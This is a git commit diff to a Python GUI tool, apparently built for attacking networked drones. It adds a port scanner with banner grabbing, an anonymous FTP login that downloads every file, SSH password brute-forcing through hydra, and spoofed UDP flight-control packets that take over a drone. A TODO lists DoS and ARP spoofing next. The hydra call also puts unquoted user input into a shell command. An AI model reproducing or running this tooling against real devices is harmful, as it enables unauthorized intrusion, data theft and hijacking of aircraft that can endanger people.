ebfbb6fc1900cf2317e9432f284a862cba95a536
Creeper250 <103156945+Creeper250@users.noreply.github.com>
2024-06-01 09:37:40 +0300

    Update front.py

--- front.py
+++ front.py
@@ -8,6 +8,8 @@ import subprocess
 import ipaddress
 import time
 import json
+import socket
+from ftplib import FTP
 from scapy.all import *
 from tkinter import ttk
 
@@ -15,7 +17,7 @@ customtkinter.set_appearance_mode("dark")
 customtkinter.set_default_color_theme("green")
 
 root = customtkinter.CTk()
-root.geometry("850x500")
+root.geometry("850x550")
 
 global frame
 global frame1
@@ -67,14 +69,12 @@ def des11():
 # def des11():
 #     frame11.destroy()
 #
-# def des12():
-#     frame12.destroy()
-#
-# def des13():
-#     frame13.destroy()
+def des12():
+    frame12.destroy()
 
+def des13():
+    frame13.destroy()
 
-# ------------------------------------------------------------
 # ------------------------------------------------------------
 def hash_password(password):
     return hashlib.sha256(password.encode()).hexdigest()
@@ -393,6 +393,8 @@ def DroneSelectPage():
     frame6.pack(pady=20, padx=60, fill="both", expand=True)
 
     def scan_network():
+        #cidr = "192.168.87.0/24"
+        #cidr = "10.0.0.0/22"
         cidr = "192.168.1.0/24"
         live_hosts = []
         network = ipaddress.ip_network(cidr)
@@ -428,11 +430,8 @@ def DroneSelectPage():
             selected_device_label.configure(text="Selected device: " + drone_ip)
             time.sleep(1)
             manufacturer_page()
-        
+            #selected_manufacturer()
     checkboxes = []
-
-    '''frame = customtkinter.CTkFrame(master=frame6)
-    frame.pack(padx=10, pady=10)'''
 
     live_devices_label = customtkinter.CTkLabel(master=frame6, text="Available devices:")
     live_devices_label.pack(padx=10, pady=5)
@@ -485,10 +484,10 @@ def Scan_Page():
     frame8 = customtkinter.CTkFrame(master=root)
     frame8.pack(pady=20, padx=60, fill="both", expand=True)
 
-    label = customtkinter.CTkLabel(master=frame8, text="Choose Scan method...", font=("Roboto", 36))
+    label = customtkinter.CTkLabel(master=frame8, text="Choose Test method...", font=("Roboto", 36))
     label.pack(pady=(60, 35), padx=10)
 
-    button1 = customtkinter.CTkButton(master=frame8, text="Full Test", command=FullScan)
+    button1 = customtkinter.CTkButton(master=frame8, text="Full Test", command=FullTest)
     button1.pack(pady=12, padx=10)
 
     button2 = customtkinter.CTkButton(master=frame8, text="Custom Test", command=CustomTest)
@@ -499,7 +498,7 @@ def Scan_Page():
     button3.pack(pady=12, padx=10)
 
 
-def FullScan():
+def FullTest():
     frame8.destroy()
     global frame9
     frame9 = customtkinter.CTkFrame(master=root)
@@ -507,48 +506,12 @@ def FullScan():
 
     label = customtkinter.CTkLabel(master=frame9, text="Testing...", font=("Roboto", 36), text_color="#329983")
     label.pack(pady=20, padx=20)
-    '''
-    radio_value = tkinter.StringVar()  #variable to store the selected IP address
-
-    radio = customtkinter.CTkRadioButton(frame9, text="141.68.44.205", variable=radio_value, value="141.68.44.205")
-    radio.pack(pady=(6, 3), padx=50, anchor="w")
-    radio2 = customtkinter.CTkRadioButton(frame9, text="192.168.1.1", variable=radio_value, value="192.168.1.1")
-    radio2.pack(pady=(6, 3), padx=50, anchor="w")
-
-    def save_ip_address():
-        global ipAddress
-        ipAddress = radio_value.get()
-        print("Selected IP address:", ipAddress)
-
-    button3 = customtkinter.CTkButton(master=frame9, text="Select Drone", command=save_ip_address)
-    button3.pack(pady=(0, 18), padx=(0, 40), anchor="se", expand=True)
-
-    '''
+    
+    button = customtkinter.CTkButton(master=frame9, text="Port Scanning", command=ports)
+    button.pack(pady=18, padx=40)
+   
     button4 = customtkinter.CTkButton(master=frame9, text="Back", command=lambda: [des9(), Scan_Page()])
     button4.place(relx=0.15, rely=0.93, anchor=tkinter.CENTER)
-
-
-
-def Test():
-    '''not this'''
-    frame8.destroy()
-    global frame10
-    frame10 = customtkinter.CTkFrame(master=root)
-    frame10.pack(pady=20, padx=60, fill="both", expand=True)
-
-    label = customtkinter.CTkLabel(master=frame10, text="Choose Test method...", font=("Roboto", 36))
-    label.pack(pady=(60, 35), padx=10)
-
-    button1 = customtkinter.CTkButton(master=frame10, text="Full Test", command=test_1)
-    button1.pack(pady=12, padx=10)
-
-    button2 = customtkinter.CTkButton(master=frame10, text="Custom Test", command=CustomTest())
-    button2.pack(pady=12, padx=10)
-
-    button3 = customtkinter.CTkButton(master=frame10, text="Back", command=lambda: [des10(), FullScan()],
-                                      fg_color="transparent")
-    button3.pack(pady=12, padx=10)
-
 
 def CustomTest():
     frame8.destroy()
@@ -573,6 +536,311 @@ def CustomTest():
 
     button4 = customtkinter.CTkButton(master=frame11, text="Back", command=lambda: [des11(), Scan_Page()])
     button4.place(relx=0.15, rely=0.93, anchor=tkinter.CENTER)
+
+#****************************************************************************************
+#****************************************************************************************
+#**************************************ports*******************************************
+#****************************************************************************************
+def scan_ports(target_host, result_text):
+    open_ports = []
+
+    def scan_port(port):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(1)  # Adjust timeout as needed
+                result = s.connect_ex((target_host, port))
+                if result == 0:
+                    service = socket.getservbyport(port)
+                    open_ports.append((port, service))
+                    try:
+                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s_version:
+                            s_version.settimeout(1)  # Adjust timeout as needed
+                            s_version.connect((target_host, port))
+                            s_version.sendall(b"GET / HTTP/1.0\r\n\r\n")
+                            banner = s_version.recv(1024).decode("utf-8")
+                            print(f"Version: {banner.strip()}")
+                    except socket.error:
+                        pass
+        except socket.error:
+            pass
+    
+    result_text.delete("1.0", customtkinter.END)
+    result_text.insert(customtkinter.END, f"Scanning host: {target_host}\n")
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = [executor.submit(scan_port, port) for port in range(1, 1001)]  # Scan common ports
+        for future in futures:
+            future.result()  # Wait for all tasks to complete
+    result_text.insert(customtkinter.END, "Open ports:\n")
+    for port, service in open_ports:
+        result_text.insert(customtkinter.END, f"Port: {port}, Service: {service}\n")
+
+def scan_button_clicked():
+    target_host = drone_ip
+    if not target_host:
+        customtkinter.showwarning("Warning", "Please enter a target host.")
+        return
+    scan_ports(target_host, result_text)
+    
+def ports():
+    frame9.destroy()
+    global frame12
+    frame12 = customtkinter.CTkFrame(master=root)
+    frame12.pack(pady=20, padx=60, fill="both", expand=True)
+    
+    scan_button = customtkinter.CTkButton(master=frame12, text="Scan Ports", command=scan_button_clicked)
+    scan_button.pack(padx=10, pady=20)
+    next_button = customtkinter.CTkButton(master=frame12, text="next", command=FTP_SSH)
+    next_button.pack(padx=10, pady=20)
+    global result_text
+    result_text = customtkinter.CTkTextbox(master=frame12, width=200, height=200)
+    result_text.pack(padx=10, pady=5)
+    
+    
+#****************************************************************************************
+#***********************************FTP**************************************************
+#***********************************SSH**************************************************
+#****************************************************************************************
+
+def connect_and_list_files():
+    ip_address = drone_ip
+    try:
+        global ftp
+        ftp = FTP(ip_address)
+        ftp.login()  # Try null session login
+        files = ftp.nlst()
+        ftp.quit()
+
+        # Clear existing entries (assuming previous entries were labels)
+        for widget in file_list_frame.winfo_children():
+            widget.destroy()
+
+        for file in files:
+            # Create a CTkLabel for each file in the frame
+            file_label = customtkinter.CTkLabel(master=file_list_frame, text=file)
+            file_label.pack()
+    except Exception as e:
+        CTkMessagebox(title="Error", message=f"Failed to connect or list files: {e}")
+
+def download_all_files():
+    if not len(file_list_frame.winfo_children()):
+        CTkMessagebox(title="Error", message="No files listed")
+        return
+    
+    save_directory = customtkinter.filedialog.askdirectory()
+    if not save_directory:
+        return
+    
+    try:
+        ftp = FTP(drone_ip)
+        ftp.login()
+        
+        for child in file_list_frame.winfo_children():
+            filename = child.cget("text")  # Get filename from label text
+            with open(f"{save_directory}/{filename}", "wb") as file:
+                ftp.retrbinary(f"RETR {filename}", file.write)
+        
+        ftp.quit()
+        CTkMessagebox(title="Success", message="All files downloaded successfully")
+    except Exception as e:
+        CTkMessagebox(title="Error", message=f"Failed to download files: {e}")
+
+#***********************************SSH**************************************************
+
+found_password = ""
+
+def start_brute_force():
+    global found_password
+    
+    target_ip = drone_ip
+    username = username_entry.get()
+    password_file = password_file_entry.get()
+    command = f"hydra -l {username} -P {password_file} {target_ip} ssh"
+    
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        if result.returncode == 0:
+            output = result.stdout.strip().split('\n')
+            for line in output:
+                if "login:" in line:
+                    found_password = line.split(" ")[-1]
+                    CTkMessagebox(title="Success", message=f"Password found: {found_password}")
+                    return
+            CTkMessagebox(title="Success", message="Password found but couldn't retrieve.")
+        else:
+            CTkMessagebox(title="Failed", message="Brute force unsuccessful.")
+    except FileNotFoundError:
+        CTkMessagebox(title="Error", message="Hydra not found. Make sure Hydra is installed.")
+
+def open_ssh_connection():
+    target_ip = ip_entry.get()
+    username = username_entry.get()
+    global found_password
+    password = found_password
+    if password:
+        command = f"x-terminal-emulator -e ssh {username}@{target_ip}"
+        subprocess.run(command, shell=True)
+    else:
+        CTkMessagebox(title="Error", message="No password found. Please run brute force first.")
+
+
+
+#***********************************GUI**************************************************
+
+def FTP_SSH():
+    frame12.destroy()
+    global labelf
+    labelf = customtkinter.CTkLabel(root, text="FTP & SSH Enumeration", font=("Roboto", 36), text_color="#329983")
+    labelf.pack(padx=40, pady=20)
+    
+    global nex_button
+    nex_button = customtkinter.CTkButton(master=root, text="next", command=DroneControllerPage)
+    nex_button.pack(padx=10, pady=10, side="bottom")
+    
+    global frame14
+    frame14 = customtkinter.CTkFrame(master=root)
+    frame14.pack(pady=20, padx=(60,5), side="left", fill="both", expand=True)
+    
+    label2 = customtkinter.CTkLabel(frame14, text="FTP", font=("Roboto", 32), text_color="#329983")
+    label2.pack(padx=40, pady=(10,0))
+
+    # Connect Button
+    connect_button = customtkinter.CTkButton(master=frame14, text="Connect and List Files", command=connect_and_list_files)
+    connect_button.pack(pady=12)
+
+    # File List (CTkFrame)
+    global file_list_frame
+    file_list_frame = customtkinter.CTkFrame(master=frame14)
+    file_list_frame.pack(pady=12)
+
+    # Download All Files Button
+    download_all_button = customtkinter.CTkButton(master=frame14, text="Download All Files", command=download_all_files)
+    download_all_button.pack(pady=12)
+    
+    
+    global frame15
+    frame15 = customtkinter.CTkFrame(master=root)
+    frame15.pack(pady=20, padx=(5,60), side="right", fill="both", expand=True)
+    
+    label3 = customtkinter.CTkLabel(frame15, text="SSH", font=("Roboto", 32), text_color="#329983")
+    label3.grid(row=0, column=1, padx=40, pady=(10,0))
+    
+    username_label = customtkinter.CTkLabel(frame15, text="Username:")
+    username_label.grid(row=1, column=0, padx=30, pady=(50,10))
+    username_entry = customtkinter.CTkEntry(frame15)
+    username_entry.grid(row=1, column=1, padx=10, pady=(50,10))
+
+    password_file_label = customtkinter.CTkLabel(frame15, text="Password File:")
+    password_file_label.grid(row=2, column=0, padx=30, pady=(10,30))
+    password_file_entry = customtkinter.CTkEntry(frame15)
+    password_file_entry.grid(row=2, column=1, padx=10, pady=(10,30))
+
+    start_button = customtkinter.CTkButton(frame15, text="Start Brute Force", command=start_brute_force)
+    start_button.grid(row=3, column=1, columnspan=5, padx=10, pady=(30,20))
+
+    open_connection_button = customtkinter.CTkButton(frame15, text="Open SSH Connection", command=open_ssh_connection)
+    open_connection_button.grid(row=4, column=1, columnspan=2, padx=10, pady=5)
+    
+    
+
+
+
+#****************************************************************************************
+#****************************************************************************************
+#****************************************************************************************
+#****************************************************************************************
+
+def send_payload(command, seq_num):
+        ip_address = drone_ip  # Replace "your_ip_address" with the actual IP address
+        port = 5556  # Adjust the port number according to your setup
+        try:
+            if command == "up":
+                payload = "AT*REF={},290717696\r"
+            elif command == "down":
+                payload = "AT*REF={},290711696\r"
+            elif command == "right":
+                payload = "AT*REF={},290721696\r"
+            elif command == "left":
+                payload = "AT*REF={},290731696\r"
+            elif command == "takeoff":
+                payload = "AT*REF={},290741696\r"
+            elif command == "land":
+                payload = "AT*REF={},290751696\r"
+            elif command == "turnoncamera":
+                payload = "AT*REF={},2907510942\r"
+            else:
+                log("Invalid command. Please enter 'up', 'down', 'right', 'left', 'takeoff', 'land', or 'turnOnCamera'.")
+                return
+            
+            formatted_payload = payload.format(seq_num)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.sendto(formatted_payload.encode(), (ip_address, port))
+            sock.close()
+            log("Payload sent successfully: " + formatted_payload)
+        
+        except Exception as e:
+            log("Error: " + str(e))
+        
+def send_command(command):
+        seq_num = 0
+        packet_count = 0
+        if command in ["up", "down", "right", "left", "takeoff", "land"]:
+            while packet_count < 5:
+                send_payload(command, seq_num)
+                time.sleep(1)
+                seq_num += 1
+                packet_count += 1
+            packet_count = 0
+        elif command == "turnoncamera":
+            send_payload(command, 0)
+            subprocess.Popen('pkill nc; pkill vlc', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True) 
+            time.sleep(1)
+            subprocess.Popen('nc -nvlp 1111 -u | vlc -', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)  
+            time.sleep(1)
+        else:
+            log("Invalid command. Please enter 'up', 'down', 'right', 'left', 'takeoff', 'land', or 'turnOnCamera'.")
+        
+def log(message):
+        log_text.insert(customtkinter.END, message + "\n")
+        log_text.see(customtkinter.END)
+
+def DroneControllerPage():
+    frame14.destroy()
+    frame15.destroy()
+    nex_button.destroy()
+    labelf.destroy()
+    global frame13
+    frame13 = customtkinter.CTkFrame(master=root)
+    frame13.pack(pady=20, padx=60, fill="both", expand=True)
+  
+        
+        # Create buttons for each command
+    button_up = customtkinter.CTkButton( master=frame13, text="Up ⬆️", command=lambda: send_command("up"))
+    button_up.grid(row=1, column=250, padx=3, pady=(10,2))
+        
+    button_down = customtkinter.CTkButton(  master=frame13, text="Down ⬇️", command=lambda: send_command("down"))
+    button_down.grid(row=5, column=250, padx=3, pady=(2,10))
+        
+    button_right = customtkinter.CTkButton(master=frame13, text="Right ➡️", command=lambda: send_command("right"))
+    button_right.grid(row=4, column=270, padx=(2,10), pady=3)
+        
+    button_left = customtkinter.CTkButton(master=frame13, text="Left ⬅️", command=lambda: send_command("left"))
+    button_left.grid(row=4, column=230, padx=(10,2), pady=3)
+        
+    button_takeoff = customtkinter.CTkButton(master=frame13, text="Takeoff 🚀", command=lambda: send_command("takeoff"))
+    button_takeoff.grid(row= 7, column=230, padx=5, pady=(20,3))
+        
+    button_land = customtkinter.CTkButton(master=frame13, text="Land 🛬", command=lambda: send_command("land"))
+    button_land.grid(row=7, column=270, padx=5, pady=(20,3))
+        
+    button_camera = customtkinter.CTkButton(master=frame13, text="Turn On Camera 📷", command=lambda:send_command("turnoncamera"))
+    button_camera.grid(row=7, column=250, padx=5, pady=(20,3))
+        
+        #Log text area
+    global log_text
+    log_text = customtkinter.CTkTextbox(master=frame13, height=200, width=400)
+    log_text.grid(row=4, column=250,  padx=20, pady=20)
+        
+
 
 
 #****************************************************************************************
@@ -610,3 +878,9 @@ Login()
 root.mainloop()
 print("Final selected drone IP:", drone_ip)
 print(selected_interface)
+
+'''
+TODO:   
+    - [ ] DOS -
+    - [ ] Arp Spoofing - 
+'''
